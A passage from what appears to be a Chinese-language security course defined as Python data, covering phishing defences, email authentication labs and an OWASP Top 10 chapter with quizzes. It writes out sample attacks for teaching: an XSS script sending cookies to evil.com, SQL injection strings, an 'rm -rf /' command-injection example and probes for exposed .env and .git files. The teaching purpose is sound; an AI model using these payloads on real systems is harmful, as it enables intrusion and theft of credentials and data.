                       "**通報率為什麼最重要**：\n"
                       "假設有 100 人收到真正的釣魚信，5 人點了。\n"
                       "- 情況 A：0 人通報 → 你在三週後從外部得知資料外洩\n"
                       "- 情況 B：20 人通報（含 3 個點過的）→ "
                       "**你在 10 分鐘內就知道，可以立刻封鎖網域、重設那 5 個帳號的密碼、檢查登入紀錄**\n\n"
                       "**同樣的攻擊，結果完全不同。差別只在「有沒有人講」。**\n"
                       "而「有沒有人講」取決於**通報是否容易、以及通報後會不會被罵**。",
            "note": "實作建議：在郵件軟體上放一個**「回報釣魚」按鈕**（一鍵送到 SOC），"
                    "並公開表揚通報者。**降低通報摩擦是最有效的單一改善。**",
        },
    ],
    "diagram": """<svg viewBox="0 0 680 330" xmlns="http://www.w3.org/2000/svg" role="img" aria-label="AiTM 中間人釣魚攻擊流程">
<text x="340" y="24" text-anchor="middle" fill="#e2e8f0" font-size="14" font-weight="700">AiTM 釣魚：為什麼「有 MFA 就安全」不再成立</text>
<rect x="20" y="120" width="110" height="60" rx="8" fill="#0f2233" stroke="#38bdf8" stroke-width="1.5"/>
<text x="75" y="146" text-anchor="middle" fill="#e2e8f0" font-size="12">使用者</text>
<text x="75" y="164" text-anchor="middle" fill="#64748b" font-size="10">看到的都正常</text>
<rect x="270" y="110" width="140" height="80" rx="8" fill="#2b1414" stroke="#f87171" stroke-width="2"/>
<text x="340" y="136" text-anchor="middle" fill="#fca5a5" font-size="12" font-weight="700">攻擊者代理站</text>
<text x="340" y="155" text-anchor="middle" fill="#64748b" font-size="10">即時轉送每一步</text>
<text x="340" y="173" text-anchor="middle" fill="#f87171" font-size="10">攔截 session cookie</text>
<rect x="550" y="120" width="110" height="60" rx="8" fill="#132a1e" stroke="#4ade80" stroke-width="1.5"/>
<text x="605" y="146" text-anchor="middle" fill="#86efac" font-size="12">真實登入站</text>
<text x="605" y="164" text-anchor="middle" fill="#64748b" font-size="10">認為一切合法</text>
<line x1="132" y1="138" x2="268" y2="138" stroke="#7dd3fc" stroke-width="1.6"/>
<text x="200" y="130" text-anchor="middle" fill="#7dd3fc" font-size="10">帳密 + TOTP</text>
<line x1="412" y1="138" x2="548" y2="138" stroke="#7dd3fc" stroke-width="1.6"/>
<text x="480" y="130" text-anchor="middle" fill="#7dd3fc" font-size="10">原封轉送</text>
<line x1="548" y1="166" x2="412" y2="166" stroke="#fbbf24" stroke-width="1.6"/>
<text x="480" y="182" text-anchor="middle" fill="#fbbf24" font-size="10">session cookie</text>
<line x1="268" y1="166" x2="132" y2="166" stroke="#94a3b8" stroke-width="1.2" stroke-dasharray="3 3"/>
<text x="200" y="182" text-anchor="middle" fill="#94a3b8" font-size="10">看起來登入成功</text>
<rect x="150" y="230" width="380" height="34" rx="6" fill="#2a1e13" stroke="#fbbf24"/>
<text x="340" y="252" text-anchor="middle" fill="#fcd34d" font-size="12">攻擊者拿到 cookie 後，之後登入完全不需要再過 MFA</text>
<text x="340" y="294" text-anchor="middle" fill="#4ade80" font-size="13" font-weight="700">唯一有效防禦：FIDO2 / Passkey（簽章綁定網域，假站產生不出有效簽章）</text>
<text x="340" y="316" text-anchor="middle" fill="#94a3b8" font-size="11">輔助措施：條件式存取（裝置合規檢查）、短 session 有效期、不可能旅行偵測</text>
</svg>""",
    "labs": [{
        "title": "檢查郵件安全設定與分析可疑信件",
        "goal": "驗證自己網域的 SPF/DKIM/DMARC，並學會看郵件標頭。",
        "warn": "全部是公開 DNS 查詢，安全合法。",
        "steps": [
            {"cmd": "dig +short TXT example.com | grep spf",
             "explain": "查 SPF 記錄。`-all` 代表嚴格拒絕、`~all` 是軟性失敗（較寬鬆）。",
             "output": "\"v=spf1 include:_spf.google.com include:sendgrid.net -all\"\n# 良好：明確列出授權來源並用 -all 嚴格拒絕其他"},
            {"cmd": "dig +short TXT _dmarc.example.com",
             "explain": "查 DMARC 政策。`p=none` 只觀察、`p=reject` 才是真正的保護。",
             "output": "\"v=DMARC1; p=none; rua=mailto:dmarc-reports@example.com; pct=100\"\n# 問題：p=none 只觀察不阻擋。應逐步提升至 p=quarantine 再到 p=reject"},
            {"cmd": "dig +short TXT google._domainkey.example.com",
             "explain": "查 DKIM 公鑰（selector 因寄件服務而異，常見為 google、default、s1）。",
             "output": "\"v=DKIM1; k=rsa; p=MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA...\"\n# DKIM 公鑰存在，代表有啟用郵件簽章"},
            {"cmd": "dig +short MX example.com",
             "explain": "查郵件伺服器。**這也是攻擊者情報蒐集的第一步** —"
                        "從 MX 就能推論你用哪家郵件服務。",
             "output": "10 aspmx.l.google.com.\n20 alt1.aspmx.l.google.com.\n30 alt2.aspmx.l.google.com."},
            {"cmd": "grep -E '^(Authentication-Results|Received-SPF|DKIM-Signature|Return-Path|From|Reply-To):' suspicious.eml",
             "explain": "**分析可疑郵件標頭的關鍵欄位**。"
                        "重點：From 與 Return-Path/Reply-To 是否一致。",
             "output": "From: \"陳大明 總經理\" <ceo.chen@company-tw.com>\nReply-To: accounting.dept@mail-secure.info\nReturn-Path: <bounce@mail-secure.info>\nAuthentication-Results: mx.google.com; spf=pass (domain of mail-secure.info designates 185.220.101.44 as permitted sender) dkim=none dmarc=none\nReceived-SPF: pass (mail-secure.info: domain designates 185.220.101.44 as permitted sender)\n# 三個關鍵警訊：\n# 1. SPF pass 但通過的是 mail-secure.info，不是 company-tw.com → 攻擊者自己的網域設定正確\n# 2. Reply-To 與 From 完全不同網域 → 回信會寄給攻擊者\n# 3. dkim=none dmarc=none → 顯示名稱是偽造的"},
            {"cmd": "python3 -c \"\nimport re\nheaders = open('suspicious.eml', errors='ignore').read()[:4000]\nfrom_dom = re.search(r'^From:.*@([\\w.-]+)', headers, re.M)\nreply_dom = re.search(r'^Reply-To:.*@([\\w.-]+)', headers, re.M)\nprint('From 網域   :', from_dom.group(1) if from_dom else '-')\nprint('Reply-To 網域:', reply_dom.group(1) if reply_dom else '-')\nif from_dom and reply_dom and from_dom.group(1) != reply_dom.group(1):\n    print('>>> 警訊：Reply-To 與 From 網域不一致 → 高度可疑')\n\"",
             "explain": "把「From 與 Reply-To 不一致」這個判斷自動化 — "
                        "這是郵件閘道規則的核心邏輯之一。",
             "output": "From 網域   : company-tw.com\nReply-To 網域: mail-secure.info\n>>> 警訊：Reply-To 與 From 網域不一致 → 高度可疑"},
            {"cmd": "dig +short A company-tw.com; whois company-tw.com | grep -iE 'creation|registrar'",
             "explain": "**查相似網域的註冊時間**。剛註冊幾天的網域用來寄公司內部信 = 幾乎確定是釣魚。",
             "output": "185.220.101.44\nRegistrar: NameSilo, LLC\nCreation Date: 2026-07-28T14:22:10Z\n# 兩天前註冊 → 專為此次攻擊建立的網域"},
        ],
    }],
    "quiz": [
        {"q": "社交工程中最有效的心理原則組合是？",
         "options": ["喜好 + 互惠", "權威 + 急迫", "稀少 + 從眾", "互惠 + 稀少"],
         "answer": 1,
         "why": "權威讓你不敢質疑，急迫讓你沒時間思考。實用防禦口訣："
                "「權威 + 急迫 + 要求繞過流程」同時出現就是攻擊。"},
        {"q": "SPF、DKIM、DMARC 三者中，哪一個負責「告訴收信端驗證失敗時該怎麼處理」？",
         "options": ["SPF", "DKIM", "DMARC", "三者都可以"],
         "answer": 2,
         "why": "DMARC 定義政策（none/quarantine/reject）並提供報告機制。"
                "只設 SPF/DKIM 不夠，因為收信端不知道失敗要怎麼辦。"},
        {"q": "DMARC 導入時，為什麼不該直接設 `p=reject`？",
         "options": ["會降低郵件速度", "可能擋掉自己未列入 SPF 的合法寄件系統（行銷平台、ERP、監控）",
                     "違反法規", "reject 不被支援"],
         "answer": 1,
         "why": "正確流程是先 p=none 收集報告找出所有合法寄件來源，"
                "補齊 SPF/DKIM 後再逐步用 pct 提升到 quarantine、reject。"},
        {"q": "攻擊者用 `company-tw.com` 冒充 `company.com` 寄信。DMARC 能擋嗎？",
         "options": ["能，DMARC 會偵測相似網域", "不能，那是攻擊者自己的網域，他可以設定完美的 SPF/DKIM",
                     "能，只要設 p=reject", "取決於郵件大小"],
         "answer": 1,
         "why": "DMARC 只保護完全相同的網域。需搭配相似網域監控、"
                "外部寄件者橫幅、顯示名稱不符偵測。"},
        {"q": "AiTM（中間人）釣魚為什麼能繞過 TOTP 型的 MFA？",
         "options": ["它破解了 TOTP 演算法", "它即時代理真實登入頁面並攔截 session cookie，之後不需再過 MFA",
                     "它猜出了驗證碼", "它關閉了 MFA"],
         "answer": 1,
         "why": "所有基於「使用者輸入一個值」的 MFA 都可被即時轉送。"
                "唯一能防的是 FIDO2/Passkey，因為其簽章綁定網域。"},
        {"q": "釣魚演練中，最重要的指標應該是？",
         "options": ["點擊率越低越好", "通報率與平均通報時間",
                     "完成訓練的人數", "答對題數"],
         "answer": 1,
         "why": "真實攻擊必然有人會點。差別在於「有沒有人立刻講」— "
                "有通報你能在幾分鐘內處置，沒通報你可能三週後才從外部得知。"},
        {"q": "對答錯釣魚演練的員工公開責罵，會造成什麼後果？",
         "options": ["員工變得更警覺", "員工下次真的中招時不敢通報，讓組織失去最重要的早期預警",
                     "沒有影響", "提升整體安全"],
         "answer": 1,
         "why": "懲罰文化會壓抑通報。正確做法是獎勵通報、不懲罰中招，"
                "並降低通報摩擦（一鍵回報按鈕）。"},
        {"q": "BEC（商業郵件詐騙）最有效的防禦是？",
         "options": ["更好的防毒軟體", "流程控制：任何變更付款帳戶或大額匯款，必須透過原有電話號碼向本人回撥確認",
                     "更強的密碼", "封鎖所有外部郵件"],
         "answer": 1,
         "why": "BEC 不含惡意程式，技術防禦幾乎無效。"
                "這是「流程控制勝過技術控制」的典型例子。回撥必須用電話簿的號碼，不是信裡給的。"},
        {"q": "Pharming 與 Phishing 的關鍵差別是？",
         "options": ["Pharming 只用簡訊", "Pharming 透過 DNS 毒化或改 hosts 檔把你導向假站，不需要你點連結",
                     "Pharming 只針對高層", "兩者完全相同"],
         "answer": 1,
         "why": "使用者輸入正確網址仍會到假站，所以「小心不要點連結」對它無效。"
                "對策是 DNSSEC、DNS 過濾與端點防護。"},
        {"q": "「在信件最上方加上『此信來自外部』橫幅」屬於什麼類型的措施，為什麼有效？",
         "options": ["技術性偵測控制；能自動封鎖惡意信",
                     "低成本的提示性控制；讓「冒充內部同事」的攻擊立刻現形，且不需使用者記住任何規則",
                     "矯正性控制；能還原被刪郵件", "沒有效果"],
         "answer": 1,
         "why": "投報率極高。它把判斷負擔從「使用者要記住規則」轉為「系統直接呈現事實」。"},
    ],
    "keywords": ["社交工程", "釣魚", "魚叉式釣魚", "捕鯨", "BEC", "Vishing", "Smishing",
                 "Quishing", "Pharming", "AiTM", "MFA 疲勞", "SPF", "DKIM", "DMARC",
                 "FIDO2", "Passkey", "尾隨", "肩窺", "釣魚演練", "通報率"],
    "takeaway": [
        "「權威 + 急迫 + 要求繞過流程」同時出現就是攻擊 — 把它寫成公司政策。",
        "SPF/DKIM 只做驗證，DMARC 才定義失敗處置；但都擋不到相似網域。",
        "釣魚演練最重要的指標是通報率而非點擊率；懲罰中招會摧毀早期預警能力。",
    ],
})

CH.append({
    "id": "s03",
    "title": "應用程式與 Web 安全（OWASP Top 10）",
    "subtitle": "注入、XSS、認證缺陷、SSRF、安全開發生命週期",
    "level": "進階",
    "minutes": 24,
    "summary": "大部分對外的攻擊面是網站與 API。OWASP Top 10 是最該優先理解的漏洞清單。",
    "why": "網站就像**對外開放的營業櫃檯**：任何人都能走到你面前遞單子。"
           "如果你不檢查單子內容就照做（不驗證輸入），"
           "有人就會在單子上寫「順便把保險箱打開」。**這就是注入攻擊的本質。**",
    "sections": [
        {
            "heading": "注入攻擊：不信任任何輸入",
            "body": "**注入的通用原理**：程式把「使用者的資料」當成「指令」來執行。\n\n"
                    "**SQL Injection（最經典）**：\n"
                    "```\n"
                    "# 危險的程式（把使用者輸入直接拼進 SQL）\n"
                    "query = \"SELECT * FROM users WHERE name='\" + name + \"'\"\n"
                    "\n"
                    "# 使用者輸入： ' OR '1'='1\n"
                    "# 拼出來變成： SELECT * FROM users WHERE name='' OR '1'='1'\n"
                    "# → 條件永遠為真，回傳所有使用者\n"
                    "\n"
                    "# 更糟的輸入： '; DROP TABLE users; --\n"
                    "```\n\n"
                    "**根本解法：參數化查詢 (Parameterized Query / Prepared Statement)**\n"
                    "```python\n"
                    "# 正確：資料與指令分開，資料庫知道 name 只是「值」不是「指令」\n"
                    "cursor.execute(\"SELECT * FROM users WHERE name = %s\", (name,))\n"
                    "```\n\n"
                    "**其他注入**：\n"
                    "- **命令注入 (OS Command Injection)**：`; rm -rf /`\n"
                    "- **LDAP 注入**、**XML/XXE 注入**、**NoSQL 注入**\n"
                    "- **範本注入 (SSTI)**：`{{7*7}}` 變成 49 → 可執行程式碼\n\n"
                    "**通用防禦三原則**：\n"
                    "1. **輸入驗證**（白名單：只允許預期的格式）\n"
                    "2. **參數化 / 逃逸**（讓資料永遠是資料）\n"
                    "3. **最小權限**（資料庫帳號不該有 DROP TABLE 權限）",
            "example": "**為什麼「過濾危險字元」不是好方法**：\n\n"
                       "很多人的第一反應是「那我把 `'`、`;`、`--` 過濾掉不就好了」。\n\n"
                       "**這是黑名單思維，永遠有漏網之魚**：\n"
                       "- 編碼繞過：`%27` 是 `'` 的 URL 編碼\n"
                       "- 雙重編碼：`%2527`\n"
                       "- Unicode 變體、大小寫混合（`UnIoN sElEcT`）\n"
                       "- 註解拆解：`UN/**/ION`\n\n"
                       "**參數化查詢從根本上解決問題**：\n"
                       "它不是「過濾壞東西」，而是「**把資料和指令的通道徹底分開**」。"
                       "資料庫收到的是「這是一個叫做 name 的值」，"
                       "無論值裡面寫什麼，都不可能變成 SQL 指令。\n\n"
                       "**這給出一個通用的資安設計原則：**\n"
                       "> **與其枚舉所有壞的（黑名單），不如從結構上讓壞的不可能發生。**\n\n"
                       "同樣的思路也出現在：預備語句防注入、輸出編碼防 XSS、"
                       "CSP 防腳本執行、參數化防命令注入。",
            "note": "考點：防 SQL Injection 的**首選是參數化查詢**，不是輸入過濾、"
                    "也不是 WAF。WAF 是縱深防禦的一層（補償控制），不是根本解法。",
        },
        {
            "heading": "XSS：讓別人的瀏覽器替你執行程式",
            "body": "**XSS（跨站腳本）**：攻擊者把 JavaScript 塞進網頁，"
                    "**讓其他使用者的瀏覽器去執行**。\n\n"
                    "**三種類型**：\n"
                    "- **儲存型 (Stored)**：惡意腳本存進資料庫（例如留言板），"
                    "**每個看到的人都中招** — 最危險。\n"
                    "- **反射型 (Reflected)**：腳本在 URL 參數裡，"
                    "受害者點了帶毒連結才觸發。\n"
                    "- **DOM 型**：完全在前端 JavaScript 處理時發生。\n\n"
                    "**能造成什麼**：竊取 session cookie（等於盜帳號）、"
                    "偽造操作、鍵盤側錄、把使用者導向釣魚頁。\n\n"
                    "**防禦**：\n"
                    "1. **輸出編碼 (Output Encoding)** — **最核心**。"
                    "把 `<` 變成 `&lt;`，瀏覽器就當它是文字不是標籤。\n"
                    "2. **Content Security Policy (CSP)** — 告訴瀏覽器「只執行來自這些來源的腳本」，"
                    "即使有 XSS，注入的腳本也不會被執行。\n"
                    "3. **Cookie 加上 `HttpOnly`** — JavaScript 讀不到 cookie，"
                    "就算中了 XSS 也偷不走 session。\n"
                    "4. 現代框架（React、Vue）預設會編碼輸出，大幅降低風險。",
            "example": "**XSS 竊取 cookie 的完整鏈與每一層防禦**：\n\n"
                       "```\n"
                       "攻擊：在留言板貼上\n"
                       "  <script>fetch('https://evil.com/?c='+document.cookie)</script>\n"
                       "\n"
                       "如果沒有防禦：\n"
                       "  1. 腳本被存進資料庫（缺輸入處理）\n"
                       "  2. 其他使用者瀏覽時，瀏覽器執行它（缺輸出編碼）\n"
                       "  3. 腳本讀取 cookie（缺 HttpOnly）\n"
                       "  4. 把 cookie 送到 evil.com（缺 CSP）\n"
                       "  5. 攻擊者用 cookie 冒充受害者登入\n"
                       "\n"
                       "四層防禦，任何一層生效就阻斷：\n"
                       "  輸出編碼  → <script> 變成文字，不執行         (擋在第 2 步)\n"
                       "  HttpOnly  → document.cookie 讀不到 session    (擋在第 3 步)\n"
                       "  CSP       → 禁止連到 evil.com                 (擋在第 4 步)\n"
                       "  SameSite  → cookie 不隨跨站請求送出           (額外保護)\n"
                       "```\n\n"
                       "**這再次展示深度防禦：不依賴單一措施，每一層都假設前一層會失效。**",
            "note": "考點：**SQL Injection 是攻擊伺服器與資料庫；XSS 是攻擊其他使用者的瀏覽器。**"
                    "兩者常被混淆。防 SQLi 用參數化，防 XSS 用輸出編碼 — 方向不同。",
        },
        {
            "heading": "認證、Session 與存取控制缺陷",
            "body": "**OWASP 排名第一的常是「存取控制失效 (Broken Access Control)」**：\n\n"
                    "- **IDOR（不安全的直接物件引用）**："
                    "把網址的 `?order=1001` 改成 `?order=1002` 就看到別人的訂單。"
                    "**根因是伺服器沒有檢查「這筆資料是不是屬於當前登入者」。**\n"
                    "- **權限提升**：一般使用者呼叫管理員 API（前端藏起來不代表後端有保護）\n"
                    "- **強制瀏覽**：直接輸入 `/admin` 網址\n\n"
                    "**認證缺陷**：\n"
                    "- 弱密碼政策、沒有 MFA\n"
                    "- Session token 可預測、不會過期、登出後仍有效\n"
                    "- 密碼用明文或弱雜湊（MD5）儲存\n"
                    "- 帳號枚舉（「此帳號不存在」vs「密碼錯誤」洩漏了帳號是否存在）\n\n"
                    "**Session 安全**：\n"
                    "- 登入後**重新產生 session ID**（防 session fixation）\n"
                    "- Cookie 設 `Secure`（只走 HTTPS）+ `HttpOnly` + `SameSite`\n"
                    "- 合理的閒置逾時與絕對逾時\n"
                    "- 重要操作要求重新驗證",
            "example": "**IDOR 的可怕在於它「看起來完全正常」**：\n\n"
                       "```\n"
                       "GET /api/invoices/1001    ← 你的發票，正常\n"
                       "GET /api/invoices/1002    ← 只是改個數字，就看到別人的\n"
                       "```\n\n"
                       "- 沒有惡意程式\n"
                       "- 沒有異常字元\n"
                       "- 每個請求單獨看都是合法的 API 呼叫\n"
                       "- WAF 完全偵測不到\n\n"
                       "**唯一的防線是後端授權檢查**：\n"
                       "```python\n"
                       "invoice = get_invoice(id)\n"
                       "if invoice.owner_id != current_user.id:   # ← 這一行\n"
                       "    return 403  # 禁止\n"
                       "```\n\n"
                       "**這帶出一個重要觀念：授權必須在後端、針對每一個請求、"
                       "檢查「這個人有沒有權存取這筆特定資料」。**\n"
                       "「前端把按鈕藏起來」「網址不公開」都不是保護 — "
                       "這叫**隱晦式安全 (Security by Obscurity)**，不可依賴。\n\n"
                       "**偵測方式**：監控「同一使用者短時間內循序存取大量不同 ID」"
                       "（1001, 1002, 1003…）= 正在枚舉。",
            "note": "考點：**Security by Obscurity（靠隱藏來安全）不是安全機制。**"
                    "隱藏可以當作「額外一層」（縱深防禦），但絕不能當作「唯一一層」。"
                    "系統的安全性不應該依賴於「攻擊者不知道它怎麼運作」。",
        },
        {
            "heading": "安全開發生命週期（SDLC）與供應鏈",
            "body": "**安全不能等到上線才做，成本會暴增**。"
                    "在設計階段修一個漏洞的成本，遠低於上線後修。\n\n"
                    "**把安全嵌入每個開發階段**：\n"
                    "- **需求**：把安全需求寫進規格（例如「所有 API 需授權」）\n"
                    "- **設計**：威脅塑模 (Threat Modeling)，問「這裡會怎麼被攻擊」\n"
                    "- **開發**：安全編碼規範、程式碼審查\n"
                    "- **測試**：\n"
                    "  - **SAST**（靜態）：掃原始碼找漏洞模式\n"
                    "  - **DAST**（動態）：對執行中的應用做攻擊測試\n"
                    "  - **SCA**（組成分析）：**檢查用了哪些第三方套件、有沒有已知漏洞**\n"
                    "  - **滲透測試**：人工深入測試\n"
                    "- **部署**：安全組態、密鑰管理、最小權限\n"
                    "- **維運**：監控、修補、事件回應\n\n"
                    "**供應鏈安全（近年重點）**：\n"
                    "- 現代應用 80%+ 的程式碼來自第三方套件\n"
                    "- **SBOM（軟體物料清單）**：清楚記錄用了哪些元件與版本\n"
                    "- 鎖定依賴版本、驗證來源、掃描已知漏洞",
            "example": "**Log4Shell（CVE-2021-44228）為什麼是分水嶺**：\n\n"
                       "Log4j 是一個極普遍的 Java 日誌函式庫。它的一個漏洞讓"
                       "「只要讓應用程式**記錄**一段特製字串，就能遠端執行程式碼」。\n\n"
                       "**災難性的原因**：\n"
                       "1. 幾乎每個 Java 應用都用它 → 影響面極廣\n"
                       "2. 很多公司**根本不知道自己用了它**"
                       "（它是某個套件的某個套件的依賴）\n"
                       "3. 觸發極簡單（在使用者名稱、User-Agent 填入特製字串即可）\n\n"
                       "**它帶來的教訓**：\n"
                       "- **你必須知道自己用了什麼**（這就是 SBOM 的價值）\n"
                       "- 「我沒有直接用 Log4j」不代表安全 — 傳遞依賴也算\n"
                       "- SCA 工具（掃描依賴漏洞）從「加分項」變成「必需品」\n"
                       "- 需要能快速回答「我的哪些系統含有元件 X」的能力\n\n"
                       "**這也呼應了基礎路線講的：資產盤點是一切的前提** — "
                       "只是這次盤點的對象從「主機」延伸到「軟體元件」。",
            "note": "考點：SAST 看**原始碼**（不執行，早期就能做，但誤報多）；"
                    "DAST 看**執行中的應用**（黑箱，誤報少但較晚）；"
                    "SCA 看**第三方依賴**。三者互補，不能互相取代。",
        },
    ],
    "table": {
        "caption": "OWASP Top 10（2021）與對應防禦",
        "head": ["排名", "類別", "白話", "核心防禦"],
        "rows": [
            ["A01", "存取控制失效", "改個 ID 就看到別人資料 (IDOR)", "後端逐請求授權檢查"],
            ["A02", "加密機制失效", "敏感資料未加密或用弱加密", "TLS、強加密、正確金鑰管理"],
            ["A03", "注入", "SQL/命令注入", "參數化查詢、輸入驗證、最小權限"],
            ["A04", "不安全設計", "設計階段就有缺陷", "威脅塑模、安全設計原則"],
            ["A05", "安全設定錯誤", "預設密碼、多餘功能、錯誤訊息洩漏", "加固基準、最小化"],
            ["A06", "危險或過期元件", "第三方套件有已知漏洞", "SCA、SBOM、及時更新"],
            ["A07", "認證與識別失效", "弱密碼、session 缺陷", "MFA、安全 session 管理"],
            ["A08", "軟體與資料完整性失效", "供應鏈、不安全的反序列化", "簽章驗證、CI/CD 安全"],
            ["A09", "日誌與監控失效", "沒記錄、沒告警", "完整日誌、集中化、告警"],
            ["A10", "SSRF", "伺服器被騙去連內部資源", "白名單、封鎖內網位址"],
        ],
    },
    "labs": [{
        "title": "檢查 Web 應用的安全標頭與常見弱點",
        "goal": "用簡單工具評估一個網站的基本安全態勢。",
        "warn": "**只測試你自己擁有或有書面授權的網站。對他人網站做攻擊測試在台灣可能觸犯刑法。**",
        "steps": [
            {"cmd": "curl -sI https://example.com | grep -iE 'strict-transport|content-security|x-frame|x-content-type|referrer|permissions-policy'",
             "explain": "檢查安全回應標頭。缺少哪些，就代表少了哪層防禦。",
             "output": "strict-transport-security: max-age=31536000; includeSubDomains\nx-content-type-options: nosniff\n# 有 HSTS 與 nosniff，但缺少：\n#   content-security-policy（防 XSS 的關鍵）\n#   x-frame-options（防點擊劫持）\n#   referrer-policy、permissions-policy"},
            {"cmd": "curl -sI https://example.com | grep -iE '^server:|x-powered-by:'",
             "explain": "**資訊洩漏檢查**：伺服器與框架版本不該對外顯示，這會幫攻擊者選 exploit。",
             "output": "server: Apache/2.4.29 (Ubuntu)\nx-powered-by: PHP/7.2.24\n# 兩者都洩漏了精確版本 → 攻擊者可直接查對應的已知 CVE\n# 應在設定中隱藏：Apache ServerTokens Prod、PHP expose_php Off"},
            {"cmd": "curl -s -o /dev/null -w '%{http_code}\\n' https://example.com/admin https://example.com/.git/config https://example.com/.env",
             "explain": "**強制瀏覽測試**：檢查敏感路徑有沒有暴露。.git 與 .env 外洩是重大事故。",
             "output": "403\n200\n200\n# 災難：.git/config 與 .env 都回 200（可存取）\n# .env 常含資料庫密碼與 API 金鑰；.git 可還原完整原始碼\n# 立即處理：移出 web 根目錄或在伺服器層封鎖這些路徑"},
            {"cmd": "curl -s \"https://example.com/search?q=<script>alert(1)</script>\" | grep -o '<script>alert(1)</script>'",
             "explain": "**反射型 XSS 快速測試**：如果輸入的 script 原封不動出現在回應裡，代表沒有輸出編碼。",
             "output": "<script>alert(1)</script>\n# 輸入被原樣反射 → 存在反射型 XSS。若正確編碼應顯示為 &lt;script&gt;"},
            {"cmd": "curl -s \"https://example.com/product?id=1'\" | grep -iE 'sql|syntax|mysql|warning'",
             "explain": "**SQL 錯誤洩漏測試**：在參數後加單引號，若回傳資料庫錯誤訊息，代表可能有注入且錯誤處理不當。",
             "output": "You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version near ''1''' at line 1\n# 兩個問題：1) 可能存在 SQL Injection  2) 錯誤訊息直接洩漏給使用者（資訊洩漏）"},
            {"cmd": "grep -rniE '(password|api_key|secret|token)\\s*=\\s*[\"'\\''][^\"'\\'']+' ./src --include='*.py' --include='*.js' | head -5",
             "explain": "**硬編碼機密檢查**：把密碼寫在原始碼裡是常見錯誤，尤其危險的是會進到 git 歷史。",
             "output": "./src/config.py:12:DB_PASSWORD = \"Sup3rSecret!2024\"\n./src/api/client.js:8:const API_KEY = \"sk_live_a1b2c3d4e5f6g7h8\"\n# 兩個硬編碼機密。即使之後刪除，git 歷史仍保留 → 需輪換金鑰並改用環境變數/密鑰管理"},
        ],
    }],
    "quiz": [
        {"q": "防禦 SQL Injection 的首選方法是？",
         "options": ["過濾單引號等危險字元", "使用參數化查詢，把資料與指令的通道徹底分開",
                     "只用 WAF", "隱藏資料庫錯誤訊息"],
         "answer": 1,
         "why": "黑名單過濾永遠有繞過方式。參數化查詢從結構上讓資料不可能被當成指令。"
                "WAF 是縱深防禦的補償層，不是根本解法。"},
        {"q": "SQL Injection 與 XSS 的攻擊目標分別是？",
         "options": ["都攻擊資料庫", "SQLi 攻擊伺服器/資料庫；XSS 攻擊其他使用者的瀏覽器",
                     "都攻擊瀏覽器", "SQLi 攻擊網路；XSS 攻擊硬碟"],
         "answer": 1,
         "why": "方向不同：防 SQLi 用參數化查詢，防 XSS 用輸出編碼。這是高頻混淆點。"},
        {"q": "把網址 `/invoices/1001` 改成 `/invoices/1002` 就看到別人的發票。這個漏洞叫什麼？根本防禦是？",
         "options": ["XSS；輸出編碼", "IDOR（不安全的直接物件引用）；後端針對每個請求檢查資料歸屬",
                     "SQL 注入；參數化查詢", "CSRF；加 token"],
         "answer": 1,
         "why": "IDOR 屬於存取控制失效。WAF 偵測不到（每個請求都合法）。"
                "唯一防線是後端授權檢查：這筆資料是不是屬於當前使用者。"},
        {"q": "Cookie 設定 `HttpOnly` 的作用是？",
         "options": ["只走 HTTPS", "讓 JavaScript 無法讀取該 cookie，即使發生 XSS 也偷不走 session",
                     "限制 cookie 大小", "自動過期"],
         "answer": 1,
         "why": "HttpOnly 是 XSS 竊取 session 攻擊鏈的一道防線。"
                "Secure 才是「只走 HTTPS」，SameSite 防跨站請求。三者常一起設。"},
        {"q": "「Security by Obscurity（靠隱藏來達成安全）」的正確觀念是？",
         "options": ["它是最有效的安全機制", "它不能作為唯一或主要的安全機制，但可作為縱深防禦的額外一層",
                     "它完全沒有價值", "它等同於加密"],
         "answer": 1,
         "why": "系統安全不應依賴「攻擊者不知道它怎麼運作」。隱藏可以增加攻擊成本，"
                "但真正的保護必須來自實質的存取控制與加密。"},
        {"q": "SAST、DAST、SCA 三種測試的差別是？",
         "options": ["完全相同", "SAST 掃原始碼、DAST 測執行中的應用、SCA 檢查第三方依賴漏洞",
                     "都只測前端", "都需要原始碼"],
         "answer": 1,
         "why": "三者互補。SAST 早但誤報多、DAST 晚但誤報少、SCA 針對供應鏈。不能互相取代。"},
        {"q": "Log4Shell 事件最重要的教訓是什麼？",
         "options": ["Java 不安全", "你必須知道自己用了哪些軟體元件（含傳遞依賴），這就是 SBOM 的價值",
                     "應停用所有日誌", "只用商業軟體"],
         "answer": 1,
         "why": "很多公司不知道自己間接用了 Log4j。資產盤點必須延伸到軟體元件層級，"
                "SCA 與 SBOM 因此成為必需品。"},
        {"q": "網站回應標頭出現 `Server: Apache/2.4.29` 與 `X-Powered-By: PHP/7.2.24`，問題是？",
         "options": ["沒有問題", "洩漏精確版本，讓攻擊者直接查對應的已知 CVE，應隱藏版本資訊",
                     "會降低效能", "違反 HTTP 規範"],
         "answer": 1,
         "why": "資訊洩漏（OWASP A05 設定錯誤）。應設定 ServerTokens Prod、expose_php Off 等隱藏版本。"},
        {"q": "SSRF（伺服器端請求偽造）的核心風險是？",
         "options": ["前端崩潰", "誘騙伺服器去存取內部資源（如雲端中繼資料、內網服務），繞過網路邊界",
                     "資料庫損毀", "使用者被登出"],
         "answer": 1,
         "why": "攻擊者利用伺服器作為跳板存取它有權碰、但外部碰不到的資源。"
                "防禦是白名單允許的目的地並封鎖內網與中繼資料位址。"},
        {"q": "在原始碼中發現 `DB_PASSWORD = \"Sup3rSecret!\"`（硬編碼密碼）。為什麼即使刪除也不夠？",
         "options": ["刪除就安全了", "git 歷史仍保留該密碼，必須輪換金鑰並改用環境變數或密鑰管理系統",
                     "密碼太短", "會影響效能"],
         "answer": 1,
         "why": "版本控制會永久保留歷史。正確做法是視為已洩漏、立即輪換，並改用密鑰管理。"},
    ],
    "keywords": ["OWASP", "SQL Injection", "參數化查詢", "XSS", "輸出編碼", "CSP",
                 "IDOR", "存取控制", "Security by Obscurity", "SDLC", "威脅塑模",
                 "SAST", "DAST", "SCA", "SBOM", "Log4Shell", "SSRF", "安全標頭"],
    "takeaway": [
        "與其枚舉所有壞輸入（黑名單），不如從結構上讓攻擊不可能：參數化防注入、輸出編碼防 XSS。",
        "存取控制必須在後端、針對每個請求檢查資料歸屬；隱藏不是保護。",
        "你必須知道自己用了哪些第三方元件（SBOM）— Log4Shell 讓 SCA 成為必需品。",
    ],
})

CH.append({
    "id": "s04",
    "title": "資安治理、風險與法規遵循（GRC）",
